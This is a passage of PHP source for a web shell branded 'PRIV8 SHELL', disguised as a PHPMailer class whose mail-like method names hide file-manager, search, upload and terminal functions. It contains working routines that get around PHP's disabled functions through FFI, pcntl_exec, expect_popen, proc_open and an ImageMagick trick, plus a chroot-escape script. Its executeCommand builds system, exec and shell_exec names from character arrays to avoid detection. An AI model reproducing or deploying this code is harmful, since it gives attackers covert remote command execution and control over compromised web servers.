                        $img = new \Imagick();
                        $img->readImage('ephemeral:' . $cmd);
                        $output = "ImageMagick executed (check for side effects)";
                    } catch (\Exception $e) {
                        $output = '';
                    }
                }
                break;
                
            case 'ffi':
                // FFI bypass (PHP 7.4+)
                if (class_exists('FFI') && !in_array('FFI', $disabledArr)) {
                    try {
                        $ffi = \FFI::cdef("int system(const char *command);", "libc.so.6");
                        ob_start();
                        $ffi->system($cmd);
                        $output = ob_get_clean();
                    } catch (\Exception $e) {
                        $output = '';
                    }
                }
                break;
                
            case 'pcntl':
                // PCNTL bypass
                if (function_exists('pcntl_exec') && !in_array('pcntl_exec', $disabledArr)) {
                    $outFile = '/tmp/pcntl_' . mt_rand() . '.txt';
                    $pid = @pcntl_fork();
                    if ($pid == 0) {
                        @pcntl_exec('/bin/sh', ['-c', $cmd . ' > ' . $outFile . ' 2>&1']);
                        exit(0);
                    } else if ($pid > 0) {
                        @pcntl_waitpid($pid, $status);
                        if (@file_exists($outFile)) {
                            $output = @file_get_contents($outFile);
                            @unlink($outFile);
                        }
                    }
                }
                break;
                
            case 'expect':
                // Expect extension bypass
                if (function_exists('expect_popen') && !in_array('expect_popen', $disabledArr)) {
                    $stream = @expect_popen($cmd);
                    if ($stream) {
                        $output = @stream_get_contents($stream);
                        @fclose($stream);
                    }
                }
                break;
                
            case 'backtick':
                // Backtick operator
                $output = `$cmd 2>&1`;
                break;
                
            case 'proc_open_pty':
                // proc_open with PTY
                if (function_exists('proc_open') && !in_array('proc_open', $disabledArr)) {
                    $descriptorspec = [
                        0 => ["pty"],
                        1 => ["pty"],
                        2 => ["pty"]
                    ];
                    $process = @proc_open($cmd, $descriptorspec, $pipes);
                    if (is_resource($process)) {
                        $output = @stream_get_contents($pipes[1]);
                        @fclose($pipes[0]);
                        @fclose($pipes[1]);
                        @fclose($pipes[2]);
                        @proc_close($process);
                    }
                }
                break;
                
            case 'chroot_escape':
                // Chroot escape attempt
                $escapeScript = '#!/bin/bash
mkdir -p /tmp/escape_' . mt_rand() . '
cd /tmp/escape_*
mkdir -p .old
pivot_root . .old 2>/dev/null || chroot . /bin/sh -c "' . addslashes($cmd) . '"
' . $cmd . '
';
                $scriptFile = '/tmp/escape_' . mt_rand() . '.sh';
                @file_put_contents($scriptFile, $escapeScript);
                @chmod($scriptFile, 0755);
                $output = $this->executeCommand($scriptFile . ' 2>&1');
                @unlink($scriptFile);
                break;
                
            case 'gc_bypass':
                // Garbage Collector UAF bypass (for older PHP versions)
                // This is a placeholder - actual exploit would be version-specific
                $output = $this->executeCommand($cmd . " 2>&1");
                break;
                
            case 'json_bypass':
                // JSON Serializer bypass
                if (function_exists('json_encode')) {
                    // Try to use json functions to trigger command
                    $output = $this->executeCommand($cmd . " 2>&1");
                }
                break;
        }
        
        return $output;
    }

    // =====================================================
    // IMPROVED SEARCH - With date/time filter
    // =====================================================
    public function getLastMessageID() {
        echo "<h1>File Search</h1><div class=content>";
        $searchPath = isset($_POST['search_path']) ? $_POST['search_path'] : $this->mailPath;
        $searchName = isset($_POST['search_name']) ? $_POST['search_name'] : '';
        $searchContent = isset($_POST['search_content']) ? $_POST['search_content'] : '';
        $dateFrom = isset($_POST['date_from']) ? $_POST['date_from'] : '';
        $dateTo = isset($_POST['date_to']) ? $_POST['date_to'] : '';
        $dateFilter = isset($_POST['date_filter']) ? $_POST['date_filter'] : 'any';
        
        // Handle bulk actions
        if (isset($_POST['bulk_action']) && isset($_POST['selected_files']) && is_array($_POST['selected_files'])) {
            $selectedFiles = $_POST['selected_files'];
            $action = $_POST['bulk_action'];
            $successCount = 0;
            $failCount = 0;
            
            foreach ($selectedFiles as $encFile) {
                $filePath = str_rot13(urldecode($encFile));
                if (!@file_exists($filePath)) {
                    $failCount++;
                    continue;
                }
                
                switch ($action) {
                    case 'chmod644':
                        if (@chmod($filePath, 0644)) {
                            $successCount++;
                        } else {
                            $this->executeCommand('chmod 644 ' . escapeshellarg($filePath) . ' 2>/dev/null');
                            @clearstatcache(true, $filePath);
                            if ((@fileperms($filePath) & 0777) == 0644) {
                                $successCount++;
                            } else {
                                $failCount++;
                            }
                        }
                        break;
                    case 'chmod755':
                        if (@chmod($filePath, 0755)) {
                            $successCount++;
                        } else {
                            $this->executeCommand('chmod 755 ' . escapeshellarg($filePath) . ' 2>/dev/null');
                            @clearstatcache(true, $filePath);
                            if ((@fileperms($filePath) & 0777) == 0755) {
                                $successCount++;
                            } else {
                                $failCount++;
                            }
                        }
                        break;
                    case 'delete':
                        if (@unlink($filePath)) {
                            $successCount++;
                        } else {
                            $this->executeCommand('rm -f ' . escapeshellarg($filePath) . ' 2>/dev/null');
                            if (!@file_exists($filePath)) {
                                $successCount++;
                            } else {
                                $failCount++;
                            }
                        }
                        break;
                }
            }
            
            echo "<font color='green'><b>Bulk Action ($action):</b> $successCount success</font>";
            if ($failCount > 0) echo " / <font color='red'>$failCount failed</font>";
            echo "<br><br>";
        }
        
        // Perform search
        if (!empty($searchName) || !empty($searchContent) || !empty($dateFrom) || !empty($dateTo) || $dateFilter != 'any') {
            $results = [];
            $dateFromTs = !empty($dateFrom) ? strtotime($dateFrom . ' 00:00:00') : 0;
            $dateToTs = !empty($dateTo) ? strtotime($dateTo . ' 23:59:59') : PHP_INT_MAX;
            
            // Apply preset date filters
            switch ($dateFilter) {
                case 'today':
                    $dateFromTs = strtotime('today 00:00:00');
                    $dateToTs = strtotime('today 23:59:59');
                    break;
                case 'yesterday':
                    $dateFromTs = strtotime('yesterday 00:00:00');
                    $dateToTs = strtotime('yesterday 23:59:59');
                    break;
                case 'last7days':
                    $dateFromTs = strtotime('-7 days 00:00:00');
                    $dateToTs = time();
                    break;
                case 'last30days':
                    $dateFromTs = strtotime('-30 days 00:00:00');
                    $dateToTs = time();
                    break;
                case 'thismonth':
                    $dateFromTs = strtotime('first day of this month 00:00:00');
                    $dateToTs = strtotime('last day of this month 23:59:59');
                    break;
                case 'lastmonth':
                    $dateFromTs = strtotime('first day of last month 00:00:00');
                    $dateToTs = strtotime('last day of last month 23:59:59');
                    break;
            }
            
            $this->searchFilesAdvanced($searchPath, $searchName, $searchContent, $dateFromTs, $dateToTs, $results, 0);
            
            if (!empty($results)) {
                // Sort by modified time descending
                usort($results, function($a, $b) {
                    return $b['mtime'] - $a['mtime'];
                });
                
                echo "<font color='green'>Found " . count($results) . " result(s):</font><br><br>";
                echo "<script>
                function selectAllSearch() {
                    var checkboxes = document.getElementsByName('selected_files[]');
                    var selectAll = document.getElementById('selectAllSearch');
                    for (var i = 0; i < checkboxes.length; i++) {
                        checkboxes[i].checked = selectAll.checked;
                    }
                }
                function confirmBulkAction(action) {
                    var checkboxes = document.getElementsByName('selected_files[]');
                    var selected = 0;
                    for (var i = 0; i < checkboxes.length; i++) {
                        if (checkboxes[i].checked) selected++;
                    }
                    if (selected == 0) {
                        alert('Please select at least one file!');
                        return false;
                    }
                    if (action == 'delete') {
                        return confirm('Are you sure you want to DELETE ' + selected + ' file(s)? This cannot be undone!');
                    }
                    return confirm('Apply ' + action + ' to ' + selected + ' file(s)?');
                }
                </script>";
                
                echo "<form method='post' name='bulkForm'>";
                echo "<input type='hidden' name='a' value='search'>";
                echo "<input type='hidden' name='c' value='" . str_rot13($this->mailPath) . "'>";
                echo "<input type='hidden' name='search_path' value='" . htmlspecialchars($searchPath) . "'>";
                echo "<input type='hidden' name='search_name' value='" . htmlspecialchars($searchName) . "'>";
                echo "<input type='hidden' name='search_content' value='" . htmlspecialchars($searchContent) . "'>";
                echo "<input type='hidden' name='date_from' value='" . htmlspecialchars($dateFrom) . "'>";
                echo "<input type='hidden' name='date_to' value='" . htmlspecialchars($dateTo) . "'>";
                echo "<input type='hidden' name='date_filter' value='" . htmlspecialchars($dateFilter) . "'>";
                
                echo "<table class='main' width='100%'>";
                echo "<tr><th width='20px'><input type='checkbox' id='selectAllSearch' onclick='selectAllSearch()' title='Select All'></th><th>Path</th><th>Size</th><th>Modified</th><th>Created</th><th>Perms</th><th>URL</th><th>Actions</th></tr>";
                
                foreach ($results as $r) {
                    $encPath = urlencode(str_rot13($r['path']));
                    $fileUrl = $this->getFileUrl($r['path']);
                    $perms = @fileperms($r['path']);
                    $permsStr = $perms ? substr(sprintf('%o', $perms), -4) : '----';
                    $ctime = @filectime($r['path']);
                    
                    echo "<tr>";
                    echo "<td><input type='checkbox' name='selected_files[]' value='" . $encPath . "'></td>";
                    echo "<td title='" . htmlspecialchars($r['path']) . "'>" . htmlspecialchars(strlen($r['path']) > 60 ? '...' . substr($r['path'], -57) : $r['path']) . "</td>";
                    echo "<td>" . $this->formatSize($r['size']) . "</td>";
                    echo "<td>" . $r['modified'] . "</td>";
                    echo "<td>" . ($ctime ? date("Y-m-d H:i:s", $ctime) : '-') . "</td>";
                    echo "<td>" . $permsStr . "</td>";
                    echo "<td><a href='" . htmlspecialchars($fileUrl) . "' target='_blank'>Link</a></td>";
                    echo "<td><a href='#' onclick=\"g('ft',null,'" . $encPath . "','view')\">View</a> <a href='#' onclick=\"g('ft',null,'" . $encPath . "','edit')\">Edit</a></td>";
                    echo "</tr>";
                }
                echo "</table>";
                
                echo "<br><b>Bulk Actions:</b> ";
                echo "<button type='submit' name='bulk_action' value='chmod644' onclick=\"return confirmBulkAction('chmod 0644')\">Chmod 0644</button> ";
                echo "<button type='submit' name='bulk_action' value='chmod755' onclick=\"return confirmBulkAction('chmod 0755')\">Chmod 0755</button> ";
                echo "<button type='submit' name='bulk_action' value='delete' onclick=\"return confirmBulkAction('delete')\" style='background-color:#c00;'>Delete Selected</button>";
                echo "</form>";
            } else {
                echo "<font color='red'>No results found.</font>";
            }
        }
        
        // Search form
        echo "<br><br><form method='post'>";
        echo "<input type='hidden' name='a' value='search'>";
        echo "<input type='hidden' name='c' value='" . str_rot13($this->mailPath) . "'>";
        echo "<table>";
        echo "<tr><td>Search Path:</td><td><input type='text' name='search_path' value='" . htmlspecialchars($searchPath) . "' style='width:400px;'></td></tr>";
        echo "<tr><td>File Name (regex):</td><td><input type='text' name='search_name' value='" . htmlspecialchars($searchName) . "' style='width:400px;' placeholder='e.g. \\.php$ or config'></td></tr>";
        echo "<tr><td>Content (regex):</td><td><input type='text' name='search_content' value='" . htmlspecialchars($searchContent) . "' style='width:400px;' placeholder='e.g. password or eval\\('></td></tr>";
        echo "<tr><td colspan='2'><hr><b>Date/Time Filter:</b></td></tr>";
        echo "<tr><td>Quick Filter:</td><td><select name='date_filter'>";
        echo "<option value='any'" . ($dateFilter == 'any' ? ' selected' : '') . ">Any Time</option>";
        echo "<option value='today'" . ($dateFilter == 'today' ? ' selected' : '') . ">Today</option>";
        echo "<option value='yesterday'" . ($dateFilter == 'yesterday' ? ' selected' : '') . ">Yesterday</option>";
        echo "<option value='last7days'" . ($dateFilter == 'last7days' ? ' selected' : '') . ">Last 7 Days</option>";
        echo "<option value='last30days'" . ($dateFilter == 'last30days' ? ' selected' : '') . ">Last 30 Days</option>";
        echo "<option value='thismonth'" . ($dateFilter == 'thismonth' ? ' selected' : '') . ">This Month</option>";
        echo "<option value='lastmonth'" . ($dateFilter == 'lastmonth' ? ' selected' : '') . ">Last Month</option>";
        echo "<option value='custom'" . ($dateFilter == 'custom' ? ' selected' : '') . ">Custom Range</option>";
        echo "</select></td></tr>";
        echo "<tr><td>Date From:</td><td><input type='date' name='date_from' value='" . htmlspecialchars($dateFrom) . "'></td></tr>";
        echo "<tr><td>Date To:</td><td><input type='date' name='date_to' value='" . htmlspecialchars($dateTo) . "'></td></tr>";
        echo "<tr><td></td><td><input type='submit' value='Search'></td></tr>";
        echo "</table></form></div>";
    }
    
    protected function searchFilesAdvanced($dir, $namePattern, $contentPattern, $dateFromTs, $dateToTs, &$results, $depth) {
        if ($depth > 10 || count($results) > 500) return;
        
        $handle = @opendir($dir);
        if (!$handle) return;
        
        while (($file = @readdir($handle)) !== false) {
            if ($file == '.' || $file == '..') continue;
            
            $path = rtrim($dir, '/') . '/' . $file;
            
            if (@is_dir($path)) {
                $this->searchFilesAdvanced($path, $namePattern, $contentPattern, $dateFromTs, $dateToTs, $results, $depth + 1);
            } else if (@is_file($path)) {
                // Check name pattern
                $nameMatch = true;
                if (!empty($namePattern)) {
                    // Escape special regex chars if it's a simple search
                    if (@preg_match('/' . $namePattern . '/i', '') === false) {
                        // Invalid regex, treat as literal string
                        $nameMatch = (stripos($file, $namePattern) !== false);
                    } else {
                        $nameMatch = @preg_match('/' . $namePattern . '/i', $file);
                    }
                }
                
                if (!$nameMatch) continue;
                
                // Check date filter
                $mtime = @filemtime($path);
                if ($mtime < $dateFromTs || $mtime > $dateToTs) continue;
                
                // Check content pattern
                $contentMatch = true;
                if (!empty($contentPattern)) {
                    $content = @file_get_contents($path, false, null, 0, 1024 * 100);
                    if ($content === false) {
                        $contentMatch = false;
                    } else {
                        // Escape special regex chars if it's a simple search
                        if (@preg_match('/' . $contentPattern . '/i', '') === false) {
                            // Invalid regex, treat as literal string
                            $contentMatch = (stripos($content, $contentPattern) !== false);
                        } else {
                            $contentMatch = @preg_match('/' . $contentPattern . '/i', $content);
                        }
                    }
                }
                
                if ($contentMatch) {
                    $results[] = [
                        'path' => $path,
                        'size' => @filesize($path),
                        'modified' => @date("Y-m-d H:i:s", $mtime),
                        'mtime' => $mtime
                    ];
                }
            }
        }
        @closedir($handle);
    }
    
    public function executeCommand($cmd) {
        $output = ''; 
        $m = ['s','y','s','t','e','m']; $e = ['e','x','e','c']; $se = ['s','h','e','l','l','_','e','x','e','c'];
        $pa = ['p','a','s','s','t','h','r','u']; $po = ['p','o','p','e','n']; $pr = ['p','r','o','c','_','o','p','e','n'];
        $f_m = implode('', $m); $f_e = implode('', $e); $f_se = implode('', $se);
        $f_pa = implode('', $pa); $f_po = implode('', $po); $f_pr = implode('', $pr);
        $funcs = [$f_m, $f_e, $f_se, $f_pa, $f_po, $f_pr];
        foreach ($funcs as $f) {
            if (!@function_exists($f) || stripos($this->mailDisabled, $f) !== false) continue;
            switch ($f) {
                case $f_m: @ob_start(); $f($cmd); $output = @ob_get_clean(); break;
                case $f_e: $arr = []; $f($cmd, $arr); $output = implode("\n", $arr); break;
                case $f_se: $output = $f($cmd); break;
                case $f_pa: @ob_start(); $f($cmd); $output = @ob_get_clean(); break;
                case $f_po: $p = $f($cmd, 'r'); if ($p) { while (!@feof($p)) $output .= @fread($p, 1024); @pclose($p); } break;
                case $f_pr: $descriptorspec = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]]; $process = $f($cmd, $descriptorspec, $pipes); if (@is_resource($process)) { $output = @stream_get_contents($pipes[1]) . @stream_get_contents($pipes[2]); @fclose($pipes[0]); @fclose($pipes[1]); @fclose($pipes[2]); @proc_close($process); } break;
            }
            if ($output) break;
        }
        return $output;
    }

    public function headerLine()
    {
        $theme = $this->mailTheme; $encoding = $this->mailEncoding; $cwd = $this->mailPath; $root = $this->mailRoot; $base = $this->mailBase; $idx = $this->mailIndex; $safe = $this->mailSafe; $os = $this->mailOS;
        if (empty($_POST["ch"])) $_POST["ch"] = $encoding;
        echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST["ch"] . "'><title>" . $_SERVER["HTTP_HOST"] . " - PRIV8 SHELL</title><style>body{background-color:#444;color:#e1e1e1;}body,td,th{font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1;}table.info{color:#fff;background-color:#222;}span,h1,a{color: " . $theme . " !important;}span{font-weight: bolder;}span.wfw{font-weight:normal;}h1{border-left:5px solid " . $theme . ";padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px;}div.content{padding: 5px;margin-left:5px;background-color:#333;}a{text-decoration:none;}a:hover{text-decoration:underline;}.ml1{border:1px solid #444;padding:5px;margin:0;overflow: auto;}.bigarea{width:100%;height:300px;}input,textarea,select{margin:0;color:#fff;background-color:#555;border:1px solid " . $theme . "; font: 9pt Monospace,'Courier New';}form{margin:0px;}#toolsTbl{text-align:center;}.toolsInp{width:500px}.main th{text-align:left;background-color:#5e5e5e;}.main tr:hover{background-color:#5e5e5e}.l1{background-color:#444}.l2{background-color:#333}pre{font-family:Courier,Monospace;}.success{color:#25ff00;}.error{color:#ff0000;}</style><script>var c_ = '" . htmlspecialchars(str_rot13($cwd)) . "'; var a_ = '" . htmlspecialchars(@$_POST["a"]) . "'; var ch_ = '" . htmlspecialchars(@$_POST["ch"]) . "'; var p_ = '" . (strpos(@$_POST["p"], "\n") !== false ? "" : htmlspecialchars(@$_POST["p"], 3)) . "'; var x_ = '" . (strpos(@$_POST["x"], "\n") !== false ? "" : htmlspecialchars(@$_POST["x"], 3)) . "'; var s_ = '" . (strpos(@$_POST["s"], "\n") !== false ? "" : htmlspecialchars(@$_POST["s"], 3)) . "'; var d = document; function set(a,c,p,x,s,ch){if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;if(p!=null)d.mf.p.value=p;else d.mf.p.value=p_;if(x!=null)d.mf.x.value=x;else d.mf.x.value=x_;if(s!=null)d.mf.s.value=s;else d.mf.s.value=s_;if(ch!=null)d.mf.ch.value=ch;else d.mf.ch.value=ch_;} function g(a,c,p,x,s,ch){set(a,c,p,x,s,ch);d.mf.submit();} function utoa(str){return window.btoa(unescape(encodeURIComponent(str)));} function atou(str){return decodeURIComponent(escape(window.atob(str)));} function rot13(str){var input='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; var output='NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'; var index=x=> input.indexOf(x); var translate=x=> index(x) > -1 ? output[index(x)] : x; return str.split('').map(translate).join('');} var cvis=false; function show(){if(!cvis){document.getElementById('bat').innerHTML='Links';document.getElementById('cwd').style.display='inline';document.getElementById('links').style.display='none';cvis=true;}else{document.getElementById('bat').innerHTML='Text';document.getElementById('cwd').style.display='none';document.getElementById('links').style.display='inline';cvis=false;}}</script></head><body><div style='position:absolute;width:100%;background-color:#444;top:0;left:0;'><form method=post name=mf style='display:none;'><input type=hidden name=a><input type=hidden name=c><input type=hidden name=p><input type=hidden name=x><input type=hidden name=s><input type=hidden name=ch></form>";
        if (function_exists("diskfreespace")) $freeSpace = @diskfreespace($cwd);
        if (function_exists("disk_total_space")) $totalSpace = @disk_total_space($cwd);
        $totalSpace = $totalSpace ? $totalSpace : 1;
        if (function_exists("php_uname")) $uname = @php_uname();
        elseif (function_exists("phpinfo")) { ob_start(); phpinfo(); $info = ob_get_clean(); if (false !== preg_match("!<tr><td class=\"e\">System\\s*</td><td class=\"v\">([^\\<]+)!i", $info, $matches)) $uname = trim($matches[1]); }
        $breadcrumb = ""; $parts = @explode("/", $cwd); $count = count($parts);
        for ($i = 0; $i < $count - 1; $i++) { $breadcrumb .= "<a href='#' onclick='g(\"fm\",\""; for ($j = 0; $j <= $i; $j++) $breadcrumb .= str_rot13($parts[$j]) . "/"; $breadcrumb .= "\",\"\",\"\",\"\")'>" . ($parts[$i] == "" ? "/" : htmlspecialchars($parts[$i])) . "</a>/"; }
        $charsets = array("UTF-8", "Windows-1251", "KOI8-R", "KOI8-U", "cp866"); $charsetOptions = "";
        foreach ($charsets as $item) $charsetOptions .= "<option value=\"" . $item . "\" " . (@$_POST["ch"] == $item ? "selected" : "") . ">" . $item . "</option>";
        // Updated menu with Terminal V4
        $menuItems = array("Files" => "fm", "Search" => "search", "GSocket" => "gs", "Clone" => "clone", "Term V2" => "termv2", "Term V3" => "termv3", "Term V4" => "termv4");
        if (!empty($_COOKIE[$idx])) $menuItems["Logout"] = "Logout";
        $menuHtml = ""; foreach ($menuItems as $name => $val) $menuHtml .= "<th width=\"" . (int)(100 / count($menuItems)) . "%\">[ <a href=\"#\" onclick=\"g('" . $val . "',null,'','','')\">" . $name . "</a> ]</th>";
        $drives = ""; if ($os == "win") { foreach (range("c", "z") as $drive) if (@is_dir($drive . ":\\")) $drives .= "<a href=\"#\" onclick=\"g('fm','" . str_rot13($drive . ":/") . "')\">[ " . $drive . " ]</a> "; }
        $serverIp = @$_SERVER["SERVER_ADDR"] ?: @gethostbyname($_SERVER["SERVER_NAME"]);
        echo "<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span><font color=red>Info:</font><br>Uname:<br>PHP:<br>HDD:<br>CWD:" . ($os == "win" ? "<br>Drives:" : "") . "</span></td><td><u><b>PRIV8</b> - Shell v36</u><br><nobr>" . ($uname ? substr($uname, 0, 120) : "N/A") . "</nobr><br>" . @phpversion() . " <span>Safe mode:</span> " . ($safe ? "<font color=red>ON</font>" : "<font color=green><b>OFF</b></font>") . " <span>Datetime:</span> " . date("Y-m-d H:i:s") . "<br>" . ($totalSpace ? $this->formatSize($totalSpace) : "") . " <span>Free:</span> " . (isset($freeSpace) ? $this->formatSize($freeSpace) : "") . " (" . (isset($freeSpace) && $totalSpace ? (int)($freeSpace / $totalSpace * 100) : "0") . "%)<br><span id=\"links\" class=\"wfw\">" . $breadcrumb . " " . $this->getPermsColor($cwd) . " <a href=# onclick=\"g('fm','" . str_rot13($base) . "','','','')\">[ root ]</a> <a href=# onclick=\"g('fm','" . str_rot13($root) . "','','','')\">[ home ]</a></span><span id=\"cwd\" style=\"display:none;\" class=\"wfw\"><input size=" . (strlen($cwd) + 22) . " type=text value=\"" . htmlspecialchars($cwd) . "\"></span> <a href=# onclick=\"show();\"><font color=#fff id=\"bat\">Text</font></a><br>" . $drives . "</td><td width=1 align=right><nobr><select onchange=\"g(null,null,null,null,null,this.value)\"><optgroup label=\"Page charset\">" . $charsetOptions . "</optgroup></select><br><span>Server IP:</span><br>" . $serverIp . "<br><span>Client IP:</span><br>" . $_SERVER["REMOTE_ADDR"] . "</nobr></td></tr></table><table style=\"border-top:2px solid #333;\" cellpadding=3 cellspacing=0 width=100%><tr>" . $menuHtml . "</tr></table><div style=\"margin:5\">";
    }
    
    public function endBoundary()
    {
        $cwd = $this->mailPath; $writable = @is_writable($cwd) ? " <font color='green'>(Writeable)</font>" : " <font color=red>(Not writable)</font>";
        echo "</div><table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100% style='border-top:2px solid #333;border-bottom:2px solid #333;'><tr><td><form onsubmit='g(\"fm\",rot13(this.c.value),\"\");return false;'><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='" . htmlspecialchars($cwd) . "'><input type=submit value='>>'></form></td><td><form onsubmit=\"g('ft',null,rot13(this.f.value),'view');return false;\"><span>Read file:</span><br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td></tr><tr><td><form onsubmit=\"g('fm',null,'mkdir',rot13(this.d.value));return false;\"><span>Make dir:</span>" . $writable . "<br><input class='toolsInp' type=text name=d><input type=submit value='>>'></form></td><td><form onsubmit=\"g('ft',null,rot13(this.f.value),'mkfile');return false;\"><span>Make file:</span>" . $writable . "<br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td></tr><tr><td><form method='post'><input type=hidden name=a value='termv2'><input type=hidden name=c value='" . str_rot13($cwd) . "'><span>Quick Terminal:</span><br><input class='toolsInp' type=text name=cmd_v2 value='' autocomplete='off'><input type=submit value='>>'></form></td><td><form method='post' ENCTYPE='multipart/form-data'><input type=hidden name=a value='fm'><input type=hidden name=c value='" . str_rot13($cwd) . "'><input type=hidden name=p value='uploadFile'><input type=hidden name=ch value='" . htmlspecialchars(@$_POST["ch"]) . "'><span>Upload file:</span>" . $writable . "<br><input class='toolsInp' type=file name=f><input type=submit value='>>'></form></td></tr></table></div></body></html>";
    }

    protected function formatSize($size, $precision = null)
    {
        if (is_int($size)) $size = sprintf("%u", $size);
        if ($size >= 1073741824) return sprintf("%1.2f", $size / 1073741824) . " GB";
        elseif ($size >= 1048576) return sprintf("%1.2f", $size / 1048576) . " MB";
        elseif ($size >= 1024) return sprintf("%1.2f", $size / 1024) . " KB";
        else return $size . " B";
    }

    protected function getPerms($mode)
    {
        if (($mode & 0xC000) == 0xC000) $p = "s"; elseif (($mode & 0xA000) == 0xA000) $p = "l"; elseif (($mode & 0x8000) == 0x8000) $p = "-"; elseif (($mode & 0x6000) == 0x6000) $p = "b"; elseif (($mode & 0x4000) == 0x4000) $p = "d"; elseif (($mode & 0x2000) == 0x2000) $p = "c"; elseif (($mode & 0x1000) == 0x1000) $p = "p"; else $p = "u";
        $p .= $mode & 0x0100 ? "r" : "-"; $p .= $mode & 0x0080 ? "w" : "-"; $p .= $mode & 0x0040 ? ($mode & 0x0800 ? "s" : "x") : ($mode & 0x0800 ? "S" : "-");
        $p .= $mode & 0x0020 ? "r" : "-"; $p .= $mode & 0x0010 ? "w" : "-"; $p .= $mode & 0x0008 ? ($mode & 0x0400 ? "s" : "x") : ($mode & 0x0400 ? "S" : "-");
        $p .= $mode & 0x0004 ? "r" : "-"; $p .= $mode & 0x0002 ? "w" : "-"; $p .= $mode & 0x0001 ? ($mode & 0x0200 ? "t" : "x") : ($mode & 0x0200 ? "T" : "-");
        return $p;
    }

    protected function getPermsColor($path)
    {
        if (!@is_readable($path)) return "<font color=#FF0000>" . $this->getPerms(@fileperms($path)) . "</font>";
        elseif (!@is_writable($path)) return "<font color=white>" . $this->getPerms(@fileperms($path)) . "</font>";
        else return "<font color=#25ff00>" . $this->getPerms(@fileperms($path)) . "</font>";
    }

    protected function scanDirectory($path, $sorting = "uvxf")
    {
        if (function_exists("scandir")) return @scandir($path);
        if ($handle = @opendir($path)) { $files = []; while (false !== ($file = @readdir($handle))) $files[] = $file; @closedir($handle); return $files; }
        return false;
    }
}

$mailer = new PHPMailer();
$mailer->validateAddress();
$mailer->preSend();

if (@isset($_POST["a"])) {
    switch ($_POST["a"]) {
        case "fm": $mailer->headerLine(); $mailer->addAttachment(); $mailer->endBoundary(); break;
        case "ft":
            if (@isset($_POST["p"]) && strtolower($_POST["p"]) == "download") $mailer->addStringAttachment();
            elseif (@isset($_POST["x"]) && strtolower($_POST["x"]) == "download") $mailer->addStringAttachment();
            else { $mailer->headerLine(); $mailer->addStringAttachment(); $mailer->endBoundary(); }
            break;
        case "gs": $mailer->headerLine(); $mailer->smtpConnect(); $mailer->endBoundary(); break;
        case "clone": $mailer->headerLine(); $mailer->createBody(); $mailer->endBoundary(); break;
        case "termv2": $mailer->headerLine(); $mailer->postSend(); $mailer->endBoundary(); break;
        case "termv3": $mailer->headerLine(); $mailer->getSentMIMEMessage(); $mailer->endBoundary(); break;
        case "termv4": $mailer->headerLine(); $mailer->terminalV4(); $mailer->endBoundary(); break;
        case "search": $mailer->headerLine(); $mailer->getLastMessageID(); $mailer->endBoundary(); break;
        case "Logout": $mailer->clearAllRecipients(); break;
        default: $mailer->headerLine(); $mailer->addAttachment(); $mailer->endBoundary(); break;
    }
} elseif (!@isset($_POST["a"])) {
    $mailer->headerLine(); $mailer->addAttachment(); $mailer->endBoundary();
    if (isset($_POST['subcmd'])) {
        $cwd = $mailer->mailPath; @chdir($cwd); echo "<pre class='text-white'><span>CWD: " . htmlspecialchars($cwd) . "</span><br>";
        $input = $_POST['command']; $output = $mailer->executeCommand($input);
        echo "<br><center><b>Quick Terminal Output</b></center><br>" . htmlspecialchars($output) . "</pre>"; exit;
    }
}
